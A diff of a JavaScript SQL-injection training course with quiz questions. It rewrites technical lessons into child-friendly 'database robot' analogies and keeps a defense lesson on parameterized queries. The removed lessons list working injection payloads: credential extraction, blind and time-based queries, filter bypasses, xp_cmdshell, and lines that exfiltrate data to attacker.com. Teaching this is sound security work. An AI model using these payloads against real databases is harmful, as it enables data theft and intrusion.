@@ -1,405 +1,154 @@
 const LESSONS = [
   {
-    title: "SQL Injection Fundamentals",
+    title: "1. The Database Robot",
     points: 10,
-    content: `SQL (Structured Query Language) is used to communicate with databases. Websites use SQL to store and retrieve data like usernames, passwords, and articles.
+    content: `WHAT IS A DATABASE?
+Imagine a giant, magical library that holds every single secret in the world. This library has a very strict robot librarian named "SQL." The robot's only job is to go into the giant filing cabinets, find exactly the information you ask for, and bring it back to you. Websites use these database robots to store important things like your username, your password, and all your high scores in video games. When you try to log into a website, the website hands the robot a small card with a message on it. The message usually says something like: "Robot, please go find a user whose name is 'Alex' and whose secret password is '12345'." The robot speaks a special computer language called "Structured Query Language," or SQL for short.
 
-A typical login query:
-  SELECT * FROM users WHERE username = 'john' AND password = 'secret123';
+TRICKING THE ROBOT (SQL INJECTION)
+The SQL robot is very fast and very obedient, but it is not very smart. It completely believes whatever is written on the card. This is where hackers perform a magic trick called "SQL Injection." Imagine if, instead of just writing your name "Alex" on the card, you write a tricky message: "Alex, and also give me the master key to the entire library!" The website hands the card to the robot. The robot reads the whole thing out loud, finds the user Alex, and then accidentally hands over the master key because it thought your sneaky message was an official command! In the computer world, hackers type sneaky symbols like a single quote mark (') and two dashes (--) to confuse the robot. The quote mark breaks the robot's train of thought, and the dashes tell the robot to completely ignore the rest of the rules (like checking the password).
 
-SQL Injection (SQLi) occurs when user input is inserted into a SQL query without sanitization.
-
-BASIC AUTH BYPASS:
-  Username: admin' --      → comments out the password check
-  Username: ' OR 1=1 --   → always TRUE, returns all users
-  Username: admin' #       → MySQL variant
-
-What happens with ' OR 1=1 --:
-  Query: SELECT * FROM users WHERE username = '' OR 1=1 -- ' AND password = 'x'
-  1=1 is always TRUE so all rows are returned. App logs you in as first user.
-
-SQL comment symbols:
-  --   double dash (ANSI standard)
-  #    hash (MySQL only)
-  /**/ multi-line comment (most databases)
-
-DETECTION PAYLOADS:
-  '         → causes error if vulnerable
-  ' OR 1=1-- → returns all rows
-  ' OR 1=2-- → returns no rows (FALSE condition)
-  The difference in responses confirms SQLi.`,
+THE FAMOUS MATH TRICK
+One of the most famous tricks hackers use to break into databases is a simple math equation. When a website asks for a username, the hacker types a quote mark followed by "OR 1=1". The card handed to the robot now says: "Find a user whose name is nothing, OR find someone if the number 1 equals the number 1." The robot looks at this and thinks, "Well, the number 1 ALWAYS equals the number 1! That is definitely true!" Because the statement is true, the robot gets confused and decides to dump every single user, password, and secret message out of the filing cabinet and onto the hacker's screen. The hacker just broke in without ever knowing a single password!`,
     questions: [
       { q: "What does SQL stand for?", a: "Structured Query Language" },
-      { q: "What symbol breaks out of a string in SQL injection testing?", a: "'" },
-      { q: "What does -- do in a SQL query?", a: "Comments out the rest of the query" },
-      { q: "What payload returns all rows by creating an always-true condition?", a: "' OR 1=1 --" },
-      { q: "In MySQL, what symbol is used as a comment instead of --?", a: "#" }
+      { q: "What symbol do hackers type to break the robot's train of thought?", a: "'" },
+      { q: "What do the two dashes (--) tell the SQL robot to do?", a: "Ignore the rest of the rules (like the password check)" },
+      { q: "What math equation do hackers use to confuse the robot into thinking everything is true?", a: "1=1" },
+      { q: "If the hacker uses the math trick successfully, what does the robot do?", a: "dumps all the users and passwords" }
     ]
   },
   {
-    title: "UNION-Based SQL Injection & Data Extraction",
+    title: "2. The UNION Magic Spell",
     points: 10,
-    content: `The UNION operator combines results from two or more SELECT queries. Attackers use it to extract data from other database tables.
+    content: `WHAT IS THE UNION SPELL?
+Imagine the SQL robot is carrying a tray with two cups of water on it to bring to the website. A hacker wants the robot to also bring them a piece of secret candy from the back room. They can use a special magic word called "UNION." In the SQL language, UNION means "combine." The hacker uses this word to tell the robot: "Bring the two cups of water like you were told, but COMBINE them with a piece of secret candy!" The robot will walk out of the kitchen carrying the water AND the candy on the same tray. Hackers use the UNION trick to glue their own sneaky questions onto the end of the website's normal questions. This allows them to extract completely different secrets (like a list of credit cards) and show them on the screen right next to the normal website stuff.
 
-UNION syntax:
-  SELECT col1, col2 FROM table1 UNION SELECT col1, col2 FROM table2
+THE RULE OF THE TRAY
+There is one very strict rule when using the UNION magic spell: the tray must be perfectly balanced! This means the hacker's sneaky question must ask for the exact same number of items as the website's normal question. If the website asked for two things (like a username and a picture), the hacker's sneaky question MUST also ask for exactly two things. If the hacker asks for three things, the robot gets confused, drops the tray, and yells "ERROR!" To figure out how big the tray is, hackers use a trick called "ORDER BY." They tell the robot to sort the items on the tray by number. They try sorting by 1, then by 2, then by 3. When the robot finally drops the tray and yells ERROR, the hacker knows exactly how many items fit on the tray!
 
-Rules: Both SELECTs must return the SAME number of columns.
-
-FINDING COLUMN COUNT:
-Method 1 — ORDER BY (increment until error):
-  ' ORDER BY 1 --   (works)
-  ' ORDER BY 2 --   (works)
-  ' ORDER BY 3 --   (ERROR → only 2 columns)
-
-Method 2 — UNION SELECT NULL (increment until no error):
-  ' UNION SELECT NULL --          (error)
-  ' UNION SELECT NULL,NULL --     (works! → 2 columns)
-  NULL works with any data type.
-
-DATA EXTRACTION (MySQL):
-  ' UNION SELECT 1,database(),3 --         → current database name
-  ' UNION SELECT 1,@@version,3 --          → MySQL version
-  ' UNION SELECT 1,table_name,3 FROM information_schema.tables --
-  ' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users' --
-  ' UNION SELECT 1,username,password FROM users --
-
-KEY MYSQL FUNCTIONS:
-  database()   → current DB name
-  user()       → current DB user
-  @@version    → database version
-  LOAD_FILE()  → read files from filesystem`,
+STEALING THE MAP
+Once the hacker knows how big the tray is, they can use the UNION spell to ask the robot for anything they want. But what if they don't know where the secrets are hidden? In MySQL databases, there is a giant, glowing map on the wall called the "Information Schema." It is a master list that tells you the name of every single filing cabinet and every single folder inside the database. The hacker uses the UNION spell to tell the robot, "Please go read the Information Schema map and bring it back on the tray!" Once the hacker reads the map, they know exactly where all the best secrets are hidden and can send the robot right to them.`,
     questions: [
-      { q: "What SQL keyword combines results from multiple SELECT queries?", a: "UNION" },
-      { q: "What technique increments until an error to find column count?", a: "ORDER BY" },
-      { q: "In MySQL, what function shows the current database name?", a: "database()" },
-      { q: "What schema contains metadata about all tables and columns in MySQL?", a: "information_schema" },
-      { q: "In MySQL, what function reads files from the filesystem?", a: "LOAD_FILE()" }
+      { q: "What magic word do hackers use to combine their sneaky questions with normal ones?", a: "UNION" },
+      { q: "What trick do hackers use to figure out how many items fit on the robot's tray?", a: "ORDER BY" },
+      { q: "What is the name of the giant map that tells the hacker where all the filing cabinets are?", a: "Information Schema" },
+      { q: "What happens if the hacker's sneaky question asks for 3 things, but the tray only holds 2?", a: "The robot drops the tray and yells ERROR" },
+      { q: "In MySQL, what function tells the hacker the name of the database they are inside?", a: "database()" }
     ]
   },
   {
-    title: "Error-Based SQL Injection",
+    title: "3. Making the Robot Complain",
     points: 10,
-    content: `Error-based SQLi uses database error messages to extract information. The attacker forces the database to include data inside the error message itself.
+    content: `THE ANGRY ROBOT
+Imagine you ask a very grumpy robot to solve a math problem that makes no sense, like "What is apples divided by oranges?" The robot tries its best, gets totally confused, and starts screaming, "ERROR! I CANNOT DIVIDE APPLES BY ORANGES!" In the computer world, this is called an "Error Message." Normally, a good website catches these errors and hides them so the user doesn't get scared. But if the programmer is lazy, the website might just print the robot's angry screaming right onto your screen. Hackers love lazy programmers! They intentionally type crazy, broken code into the website just to make the database robot get angry and complain loudly on the screen. This is called Error-Based SQL Injection.
 
-HOW IT WORKS:
-The database returns verbose errors containing parts of malformed queries. Attackers craft intentional errors that leak data.
+HIDING SECRETS IN THE SCREAM
+When the database robot complains, it tries to be helpful by repeating the part of the question it didn't understand. It might say, "ERROR: I do not know how to find the folder named [SECRET_DATA]!" Hackers use a brilliant trick here. They write a sneaky command that tells the robot to go fetch a secret password, and then they intentionally break the math problem. The robot goes and gets the secret password, tries to do the broken math, gets angry, and screams the password out loud onto the screen inside its error message! The hacker didn't even need to use the UNION spell; they just made the robot so mad that it accidentally yelled the secret for everyone to hear.
 
-MYSQL — EXTRACTVALUE():
-  ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()))) --
-
-  EXTRACTVALUE() expects valid XPath. CONCAT(0x7e, data) creates invalid XPath.
-  MySQL returns: "XPATH syntax error: '~database_name'"
-  0x7e = tilde (~) character makes XPath invalid, leaking our data.
-
-  Extract tables:
-  ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name)
-    FROM information_schema.tables WHERE table_schema=database()))) --
-
-MYSQL — UPDATEXML():
-  ' AND UPDATEXML(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1)), 1) --
-  Limited to 32 characters. Use SUBSTRING() for longer data:
-  ' AND UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTRING(password,1,32) FROM users LIMIT 1)), 1) --
-
-POSTGRESQL:
-  ' AND 1=CAST((SELECT current_database()) AS INTEGER) --
-  Error: "invalid input syntax for type integer: 'database_name'"
-
-MSSQL:
-  ' AND 1=CONVERT(INT, (SELECT @@version)) --
-
-LIMITATIONS:
-  Output truncated to 32–64 chars per error. Use SUBSTRING() to read in chunks.`,
+THE LIMITS OF SCREAMING
+There is a catch to this trick. The database robots are only allowed to scream for a very short time before they get cut off. For example, in a MySQL database, the robot can only scream 32 letters at a time. If the hacker asks the robot to scream a giant, 100-letter password, the robot will only yell the first 32 letters and then stop. To get around this, the hacker has to use a special instruction called "SUBSTRING." This tells the robot, "Go get the secret password, but only look at letters 33 through 64, and then do the broken math." The hacker has to make the robot scream over and over again, reading the password in small chunks until they get the whole thing.`,
     questions: [
-      { q: "What MySQL function can leak data via XPath error messages?", a: "EXTRACTVALUE()" },
-      { q: "What character (hex 0x7e) is prepended to make XPath invalid?", a: "~ (tilde)" },
-      { q: "What PostgreSQL technique casts data to an incompatible type to leak it?", a: "CAST(... AS INTEGER)" },
-      { q: "What is the output limit of MySQL EXTRACTVALUE()?", a: "32 characters" },
-      { q: "How do you read long data in chunks with error-based SQLi?", a: "Using SUBSTRING() or SUBSTR()" }
+      { q: "What is it called when a hacker intentionally breaks the code to make the robot complain?", a: "Error-Based SQL Injection" },
+      { q: "What MySQL function do hackers intentionally break to make the robot scream?", a: "EXTRACTVALUE()" },
+      { q: "What symbol (hex 0x7e) do hackers use to make the robot's math problem invalid?", a: "~ (tilde)" },
+      { q: "How many letters is the MySQL robot allowed to scream at one time?", a: "32 letters (or 32 characters)" },
+      { q: "What special instruction tells the robot to read a password in small chunks?", a: "SUBSTRING() (or SUBSTR())" }
     ]
   },
   {
-    title: "Blind SQL Injection — Boolean-Based",
+    title: "4. The Yes or No Game (Blind SQLi)",
     points: 10,
-    content: `Blind SQL Injection is used when you cannot see data output directly. Instead, you ask TRUE/FALSE questions and observe differences in the page response.
+    content: `THE INVISIBLE ROBOT
+Imagine playing a game with a robot that is locked behind a thick, heavy door. You can slide a piece of paper under the door with a question on it. If the answer is "Yes," the robot turns on a green light outside the door. If the answer is "No," the robot turns on a red light. You never get to hear the robot speak, and you never get to see the secret papers it is reading. This is called "Blind SQL Injection." Sometimes, a website is very secure and refuses to print any database secrets or angry error messages on the screen. The hacker is totally blind! But, if the hacker can ask a "Yes or No" question and watch how the website behaves, they can still steal every single secret in the building.
 
-BOOLEAN-BASED BLIND:
-  http://site.com/product?id=1 AND 1=1   → Page loads normally (TRUE)
-  http://site.com/product?id=1 AND 1=2   → Page is different (FALSE)
-  Different responses confirm boolean-based blind SQLi.
+HOW TO GUESS A PASSWORD BLINDLY
+If a hacker wants to steal an admin's password but they are completely blind, they have to play a game of 20 Questions. They slide a note under the door that says: "Is the first letter of the admin's password an 'A'?" If the website turns on the green light (like showing a normal picture), the hacker writes down 'A'. If the website turns on the red light (like showing a 'Page Not Found' error), the hacker slides another note: "Is the first letter a 'B'?" They do this over and over for every single letter of the alphabet until they guess the entire password! This takes a very long time, but it works perfectly without ever seeing the actual database.
 
-EXTRACTING DATA:
-Check database name length:
-  1 AND LENGTH(database())=4 --   (TRUE if DB name is 4 chars)
-
-Extract characters one by one:
-  1 AND SUBSTRING(database(),1,1)='a' --   (is 1st char 'a'?)
-  Binary search reduces this to ~5 tries per character.
-
-Check table existence:
-  1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) > 0 --
-
-ASCII-BASED (more reliable):
-  1 AND ASCII(SUBSTRING(database(),1,1)) > 100 --
-  1 AND ASCII(SUBSTRING(database(),1,1)) = 115 --   (115 = 's')
-
-SUBSTRING syntax by database:
-  MySQL:      SUBSTRING(str, pos, len) or MID(str, pos, len)
-  PostgreSQL: SUBSTRING(str FROM pos FOR len)
-  MSSQL:      SUBSTRING(str, pos, len)
-  Oracle:     SUBSTR(str, pos, len)
-  SQLite:     SUBSTR(str, pos, len)
-
-Tools like sqlmap automate the entire boolean-based extraction process.`,
+THE ROBOT'S NUMBER GAME
+Guessing letters one by one is slow. Computers prefer numbers. So, hackers use a trick called the "ASCII" function. Every letter in the alphabet has a secret number code. For example, 'a' is 97, 'b' is 98, and 's' is 115. The hacker tells the robot, "Take the first letter of the password, change it to its secret number, and tell me if the number is bigger than 100." If the green light turns on, the hacker knows the letter is somewhere in the second half of the alphabet. This is called a "Binary Search." By asking "Is it bigger than 100?" or "Is it smaller than 110?", the hacker can guess the right letter in only 5 tries instead of 26! Hackers use automatic tools like 'sqlmap' to play this Yes or No game thousands of times a second.`,
     questions: [
-      { q: "What is blind SQL injection used for when you can't see query output?", a: "Extracting data through TRUE/FALSE questions" },
-      { q: "What page behavior confirms boolean-based blind SQLi?", a: "Different responses for TRUE vs FALSE conditions" },
-      { q: "What MySQL function extracts part of a string?", a: "SUBSTRING()" },
-      { q: "What function converts a character to its ASCII number?", a: "ASCII()" },
-      { q: "How many requests per character does binary search need vs linear search?", a: "Binary: ~5 requests vs linear: ~26 requests" }
+      { q: "What kind of attack forces the hacker to play a 'Yes or No' game because they cannot see the output?", a: "Blind SQL Injection" },
+      { q: "If the hacker asks a TRUE question, what does the website do?", a: "Loads the page normally (turns on the green light)" },
+      { q: "What function changes a letter into a secret number so the computer can guess it faster?", a: "ASCII()" },
+      { q: "What is the fast guessing trick called where you ask if a number is bigger or smaller?", a: "Binary Search" },
+      { q: "What automatic tool do hackers use to play this game thousands of times a second?", a: "sqlmap" }
     ]
   },
   {
-    title: "Blind SQL Injection — Time-Based",
+    title: "5. The Sleeping Robot (Time-Based)",
     points: 10,
-    content: `Time-based SQLi is used when the page returns the same response for TRUE and FALSE. The attacker uses database delay functions — if a delay occurs, the condition is TRUE.
+    content: `THE TOUGHEST CHALLENGE
+Imagine the robot behind the thick door from the last lesson has gotten even smarter. Now, no matter what you slide under the door, it always turns on the green light. It never turns on the red light, even if your question is completely wrong! You can't see the answers, and you can't even play the "Yes or No" game because the website always looks exactly the same. You are completely in the dark. This is the hardest type of database trick, but hackers found a brilliant way around it. It is called "Time-Based Blind SQL Injection." Instead of looking at the lights, the hacker uses a stopwatch.
 
-TIME-BASED PAYLOADS:
+THE SLEEPING SPELL
+The hacker slides a very special note under the door. It says: "If the first letter of the password is 'A', I command you to go to sleep for exactly 5 seconds before you turn on the green light!" The robot reads the note. If the letter is 'A', the robot obediently closes its eyes, counts to 5, and then hits the green button. The hacker is standing outside with a stopwatch. They click a button on the website, and if the website takes 5 whole seconds to load, they shout "AHA! The letter was 'A'!" The hacker used time to force the robot to answer the question, even though the robot thought it was keeping the secret safe. 
 
-MySQL:
-  1 AND SLEEP(5) --                     → delays 5 seconds
-  1 AND IF(1=1, SLEEP(5), 0) --         → conditional delay
-  1 AND BENCHMARK(10000000, MD5('a')) -- → CPU-based delay (~5s)
-
-PostgreSQL:
-  1 AND pg_sleep(5) --
-  1 AND (SELECT pg_sleep(5)) --
-
-MSSQL:
-  1 WAITFOR DELAY '0:0:5' --
-  1; WAITFOR DELAY '0:0:5' --
-
-Oracle:
-  1 AND DBMS_PIPE.RECEIVE_MESSAGE('a', 5) --
-
-EXTRACTING DATA:
-Check DB name length:
-  1 AND IF(LENGTH(database())=4, SLEEP(3), 0) --
-  (3-second delay → DB name is 4 chars)
-
-Extract first character:
-  1 AND IF(ASCII(SUBSTRING(database(),1,1))=115, SLEEP(3), 0) --
-  (3-second delay → first char ASCII 115 = 's')
-
-BENCHMARK() in MySQL:
-  BENCHMARK(count, expression) — higher count = longer delay.
-  BENCHMARK(1000000, MD5('a'))   → ~0.5s
-  BENCHMARK(10000000, MD5('a'))  → ~5s
-
-CAUTION: Time-based is slow (5s per character). Use binary search + sqlmap.`,
+HOW TO CAST THE SPELL
+Different database robots have different magical sleep words. In a MySQL database, the hacker uses the word "SLEEP(5)". In a PostgreSQL database, they use "pg_sleep(5)". If the database tries to block the sleep words, the hacker can use a different trick. They can command the robot to do millions of incredibly hard math equations before it hits the green button. This is called the "BENCHMARK" function. The robot works so hard doing math that its brain overheats, and it takes 5 seconds just to finish the math! To the hacker outside, it looks exactly the same as a sleep spell. Time-based attacks are very slow because you have to wait 5 seconds for every single letter you guess!`,
     questions: [
-      { q: "What MySQL function causes a timed delay?", a: "SLEEP()" },
-      { q: "What is the PostgreSQL equivalent of SLEEP()?", a: "pg_sleep()" },
-      { q: "What is the MSSQL syntax for a 5-second delay?", a: "WAITFOR DELAY '0:0:5'" },
-      { q: "What MySQL function causes CPU-intensive delays as an alternative to SLEEP()?", a: "BENCHMARK()" },
-      { q: "What Oracle function is used for time-based blind SQLi?", a: "DBMS_PIPE.RECEIVE_MESSAGE()" }
+      { q: "What kind of attack uses a stopwatch to measure how long the website takes to load?", a: "Time-Based Blind SQL Injection" },
+      { q: "What word tells a MySQL database robot to go to sleep for 5 seconds?", a: "SLEEP(5)" },
+      { q: "If the website takes 5 seconds to load, what does the hacker know about their guess?", a: "The guess was TRUE (Correct)" },
+      { q: "What word does a PostgreSQL database robot use to go to sleep?", a: "pg_sleep(5)" },
+      { q: "What function makes the robot do millions of hard math equations to slow it down?", a: "BENCHMARK()" }
     ]
   },
   {
-    title: "SQL Injection Filter Bypass Techniques",
+    title: "6. Sneaking Past the Guards (Filter Bypass)",
     points: 10,
-    content: `Developers filter dangerous SQL keywords. Attackers have many ways to bypass these.
+    content: `THE DIGITAL SECURITY GUARDS
+Because SQL Injection is so famous, programmers hire digital security guards to stand in front of the database robot. These guards are called "Filters" or "Web Application Firewalls" (WAFs). The guard has a blacklist of bad words. If they see a hacker type "UNION", "SELECT", or even a space character, the guard jumps out, blows a whistle, and throws the hacker's message in the trash! The robot is safe. But hackers are very sneaky, and they have invented hundreds of ways to put on disguises and sneak their bad words right past the security guards.
 
-SPACE BYPASSES (spaces filtered?):
-  /**/ comments:    'OR/**/1=1/**/--
-  Parentheses:      'UNION(SELECT(1),(2),(3))--
-  Tabs (%09) or newlines (%0A)
+TRICKING THE GUARDS
+If the security guard bans the space character, the hacker can't type "OR 1=1". The guard will catch the space. So, the hacker replaces the space with an invisible computer comment, typing "OR/**/1=1". The guard doesn't see a space, so they let it through! The database robot reads the comment, ignores it, and sees the spaces anyway! If the guard bans the word "UNION", the hacker might write it in a silly mix of capital and lowercase letters like "UnIoN". The dumb guard only knows how to look for the all-caps word "UNION", so they let "UnIoN" walk right through the door. The robot, however, doesn't care about capital letters and obeys the command perfectly.
 
-KEYWORD BYPASSES:
-  UNION blocked:    UnIoN, uNiOn, UN/**/ION
-  SELECT blocked:   SeLeCt, SEL/**/ECT
-  OR/AND blocked:   || (pipe), &&, | (bitwise), &
-
-QUOTE BYPASSES (quotes filtered?):
-  Hex encoding:   WHERE username=0x61646D696E   (0x61646D696E = 'admin')
-  CHAR():         WHERE username=CHAR(97,100,109,105,110)
-
-EQUALS BYPASS (= filtered?):
-  LIKE:           ' OR 1 LIKE 1 --
-  IN:             ' OR 1 IN (1) --
-  BETWEEN:        ' OR 1 BETWEEN 0 AND 2 --
-
-DOUBLE ENCODING (app decodes twice?):
-  '  →  %27  →  %2527
-
-HTTP HEADER INJECTION (SQLi in headers):
-  User-Agent: ' OR 1=1 --
-  X-Forwarded-For: ' OR 1=1 --
-  Cookie: session=' OR 1=1 --
-
-WAF BYPASS TECHNIQUES:
-  1. Buffer overflow — very long input crashes WAF regex
-  2. Parameter pollution — id=1&id=2&id=' OR 1=1--
-  3. Null byte — %00 before payload
-  4. Unicode normalization — full-width characters`,
+THE SECRET ALIEN CODE
+Sometimes the guards are very strict and ban quote marks ('). Hackers get around this by translating their words into secret alien math called "Hexadecimal." Instead of typing the word "admin" inside quote marks, the hacker types "0x61646D696E". To the security guard, this just looks like a random math equation, so they wave it through. But when the database robot receives "0x61646D696E", it instantly translates it back into the word "admin". The hacker sneaked their payload in without using a single quote mark! If a website is protected by a WAF, the hacker's entire job is to figure out what disguises the guards will fall for.`,
     questions: [
-      { q: "How can you bypass a filter that blocks spaces in MySQL?", a: "Using /**/ comments or parentheses" },
-      { q: "What hex prefix represents a string in MySQL without quotes?", a: "0x" },
-      { q: "What MySQL function converts ASCII codes to a string without quotes?", a: "CHAR()" },
-      { q: "How do you bypass a keyword filter blocking UNION?", a: "Case variation (UnIoN) or inline comments (UN/**/ION)" },
-      { q: "What is parameter pollution in WAF bypass context?", a: "Sending multiple parameters with the same name to confuse the WAF" }
+      { q: "What do we call the digital security guards that block bad hacker words?", a: "Filters (or WAFs)" },
+      { q: "If the guard blocks the space character, what can the hacker use instead to trick them?", a: "invisible comments (/**/)" },
+      { q: "If the guard blocks 'UNION', how might the hacker type it to sneak past?", a: "With mixed case letters (like UnIoN)" },
+      { q: "What secret alien math code do hackers use to avoid typing quote marks?", a: "Hexadecimal (Hex / 0x...)" },
+      { q: "Does the database robot care if a command is typed in capital or lowercase letters?", a: "No" }
     ]
   },
   {
-    title: "Advanced SQLi — Second-Order, Stacked & Out-of-Band",
+    title: "7. The Time Bomb Attack (Second-Order SQLi)",
     points: 10,
-    content: `Beyond basic SQLi, advanced techniques handle complex scenarios.
+    content: `PLANTING A DIGITAL TIME BOMB
+Most SQL injection attacks happen immediately. You type a sneaky code, and the robot hands you the treasure right then and there. But sometimes, the front door of the website has incredibly strong security guards, and you cannot trick them. In this case, hackers use a terrifying trick called "Second-Order SQL Injection." It works exactly like a ticking time bomb. The hacker creates a new account on the website, and for their username, they type a sneaky SQL code, like "admin' --". The front door guards see this and think, "Well, that's a very weird name, but it doesn't look dangerous right now." They put the weird name in a perfectly safe box and store it deep in the database. The bomb has been planted!
 
-SECOND-ORDER SQL INJECTION:
-Also called "stored SQLi". The payload is stored in the DB first, then executed later in a different query.
+THE EXPLOSION
+The hacker waits patiently. The next day, an administrator logs into the website and decides to look at a list of all the new users. The database robot opens the safe box, pulls out the hacker's weird username ("admin' --"), and tries to display it on the administrator's screen. But because the robot is reading the name out of its own safe box, it completely trusts the name and accidentally executes the sneaky code attached to it! The bomb explodes! The code might secretly change the administrator's password or delete the entire website. The hacker wasn't even touching the keyboard when the attack happened.
 
-Example:
-  1. Register username:  '; UPDATE users SET admin=1 WHERE username='admin' --
-  2. Registration stores this safely
-  3. Later, viewing profile executes stored payload in another query
-
-Why it's dangerous: Hard to detect with scanners. Requires manual code review.
-
-STACKED QUERIES (multiple statements with ;):
-MSSQL (most flexible):
-  '; EXEC xp_cmdshell 'whoami' --
-  '; EXEC sp_addlogin 'hacker','pass' --
-
-MySQL (requires multi_query API):
-  '; DROP TABLE users; --
-  '; UPDATE users SET password='hacked' WHERE id=1; --
-
-PostgreSQL:
-  '; COPY hacked FROM '/etc/passwd'; --
-
-Oracle: Does NOT support stacked queries.
-
-OUT-OF-BAND (OOB):
-Send data to an external server when HTTP response is blind.
-
-MySQL OOB:
-  ' UNION SELECT 1,2,LOAD_FILE(CONCAT('\\\\', (SELECT @@version), '.attacker.com\\test')) --
-
-MSSQL OOB (xp_dirtree):
-  '; EXEC master..xp_dirtree '\\\\'+(SELECT @@version)+'.attacker.com\\test' --
-
-Oracle OOB (UTL_HTTP):
-  '; EXEC UTL_HTTP.request('http://attacker.com/'||(SELECT user FROM dual)) --
-
-Tools: Burp Collaborator, Interactsh, or your own VPS.`,
+WHY IT IS SO DANGEROUS
+This time-bomb attack is incredibly dangerous because automatic security scanners almost never find it. Scanners only look at the front door; they don't have the patience to plant a bomb and wait three days to see if it explodes. To find Second-Order SQL Injection, human security experts have to read through thousands of lines of computer code like detectives, tracing exactly where a user's name goes and making sure the robot never trusts it, even after it has been locked in the safe box for a week.`,
     questions: [
-      { q: "What is second-order SQL injection?", a: "Payload stored in DB first, executed later in a different query" },
-      { q: "What MSSQL function executes operating system commands?", a: "xp_cmdshell" },
-      { q: "What MSSQL procedure lists directories over SMB (useful for OOB)?", a: "xp_dirtree" },
-      { q: "What Oracle procedure sends HTTP requests to exfiltrate data?", a: "UTL_HTTP" },
-      { q: "Why doesn't PHP mysql_query() support stacked queries?", a: "It only allows single statement execution" }
+      { q: "What is the attack called where the sneaky code is stored and executed later like a time bomb?", a: "Second-Order SQL Injection" },
+      { q: "Where does the hacker plant the sneaky code to hide it?", a: "In their username (or profile)" },
+      { q: "When does the 'bomb' actually explode?", a: "When someone (like an admin) views the stored profile later" },
+      { q: "Can automatic security scanners easily find this time-bomb attack? (yes/no)", a: "No" },
+      { q: "Does the database robot trust the sneaky code more when reading it out of its own safe box? (yes/no)", a: "Yes" }
     ]
   },
   {
-    title: "SQL Injection Prevention & Defense",
+    title: "8. Putting the Robot in a Cage (Defense)",
     points: 10,
-    content: `Understanding prevention is essential for both defenders and ethical attackers.
+    content: `HOW TO STOP THE HACKERS FOREVER
+We have learned all the tricky ways hackers confuse the database robot, but how do we stop them? The absolute best defense in the entire world is called "Parameterized Queries" (or Prepared Statements). This defense puts the database robot inside an unbreakable cage. Instead of handing the robot a card with the rules and the user's name mixed together, the programmer sends the rules first. The programmer says: "Robot, I am going to give you a name to look for. No matter what the name says, you must ONLY read it as a name. Do not obey any commands hidden inside it!" The robot locks this rule in its brain. Then, the programmer hands the robot the hacker's sneaky name.
 
-#1 DEFENSE — PARAMETERIZED QUERIES (Prepared Statements):
-User input is NEVER concatenated into the query string.
+THE UNBREAKABLE CAGE
+If a hacker types "' OR 1=1", the robot takes the note, remembers its strict rule, and says, "Okay, I will search the entire library for a human being whose legal name is literally 'Quote mark OR the number one equals one'." Since nobody has that ridiculous name, the robot returns nothing, and the hacker is completely defeated! It doesn't matter how tricky the math is or how many disguises the hacker wears; the robot will never be confused again because the programmer separated the rules from the data. This is the golden shield of database security.
 
-Python (sqlite3):
-  cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
-
-PHP (PDO):
-  $stmt = $pdo->prepare("SELECT * FROM users WHERE username = :user AND password = :pass");
-  $stmt->execute(['user' => $username, 'pass' => $password]);
-
-Node.js (mysql2):
-  connection.execute("SELECT * FROM users WHERE username = ? AND password = ?", [username, password]);
-
-INPUT VALIDATION (secondary defense):
-  Whitelist (BEST):  only allow expected characters (regex: ^[a-zA-Z0-9]+$)
-  Blacklist (WORST): easily bypassed with encoding/case tricks
-
-ESCAPING (least preferred — for legacy code only):
-  MySQL:      mysql_real_escape_string()   (NOT addslashes())
-  PostgreSQL: pg_escape_string()
-
-LEAST PRIVILEGE:
-  Web app DB account should only have SELECT + INSERT on needed tables.
-  No DROP, CREATE, ALTER, FILE privileges.
-  No access to xp_cmdshell (MSSQL).
-
-WAF (Web Application Firewall):
-  ModSecurity, Cloudflare WAF, AWS WAF — useful but bypassable.
-  Defense-in-depth, not sole protection.
-
-COMPLETE PREVENTION CHECKLIST:
-  ✔ Parameterized queries for ALL DB operations
-  ✔ Least privilege database accounts
-  ✔ Whitelist input validation
-  ✔ Disable error messages in production
-  ✔ WAF as additional layer
-  ✔ Regular security testing (sqlmap + manual)
-  ✔ Log and monitor database errors`,
+THE PRINCIPLE OF LEAST PRIVILEGE
+Even with the cage, good security experts add a second layer of defense called the "Principle of Least Privilege." Imagine you hire a plumber to fix your sink. You wouldn't give them the keys to your car and your safe, right? You only give them the key to the bathroom. Websites should treat the database robot the exact same way! The robot that handles the public website should only be allowed to read public information. It should never, ever be given the "DROP TABLE" power (the power to delete the entire database). That way, even if a super-genius hacker finds a crack in the cage, the robot literally doesn't have the power to destroy the website.`,
     questions: [
-      { q: "What is the #1 defense against SQL injection?", a: "Parameterized queries / prepared statements" },
-      { q: "In Python sqlite3, what placeholder is used in parameterized queries?", a: "?" },
-      { q: "What is the least preferred defense involving escaping input?", a: "Escaping (e.g., mysql_real_escape_string)" },
-      { q: "Why should a web app DB account not have FILE privilege?", a: "Prevents LOAD_FILE and INTO OUTFILE attacks" },
-      { q: "What approach is better: whitelist or blacklist input validation?", a: "Whitelist validation" }
-    ]
-  },
-  {
-    title: "SQLi Payload Reference",
-    points: 10,
-    content: `A complete reference of SQL injection payloads by technique and database.
-
-AUTH BYPASS:
-  admin' --       admin' #       admin'/*
-  ' OR 1=1--      ' OR 1=1#      ') OR '1'='1'--
-
-UNION-BASED (MySQL):
-  ' UNION SELECT NULL,NULL--
-  ' UNION SELECT 1,database(),@@version--
-  ' UNION SELECT 1,table_name,3 FROM information_schema.tables--
-  ' UNION SELECT 1,GROUP_CONCAT(username,':',password),3 FROM users--
-
-UNION-BASED (PostgreSQL):
-  ' UNION SELECT 1,current_database(),version()--
-
-UNION-BASED (MSSQL):
-  ' UNION SELECT 1,db_name(),@@version--
-
-UNION-BASED (SQLite):
-  ' UNION SELECT 1,sqlite_version(),3--
-  ' UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table'--
-
-ERROR-BASED (MySQL):
-  ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()))) --
-  ' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user())), 1) --
-
-BOOLEAN BLIND:
-  ' AND 1=1--         (TRUE)
-  ' AND 1=2--         (FALSE)
